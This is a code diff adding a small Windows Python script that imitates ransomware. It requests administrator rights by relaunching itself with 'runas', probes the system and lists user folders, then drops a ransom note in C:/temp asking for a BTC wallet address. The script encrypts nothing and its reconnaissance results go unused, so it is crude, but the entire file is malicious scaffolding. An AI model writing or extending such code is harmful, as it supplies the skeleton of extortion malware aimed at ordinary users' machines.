@@ -1,0 +1,25 @@
+import os
+import platform
+import ctypes, sys
+
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+
+else:
+    platform.uname()
+os.getlogin()
+os.listdir(path='C:/Users')
+
+os.mkdir(path='C:/temp/leetkitten114')
+
+with open(r'C:\temp\leetkitten114\pwned.txt', 'w') as fp:
+    fp.write('Get pwned. Enter BTC wallet address and CTRL+S')
+    pass
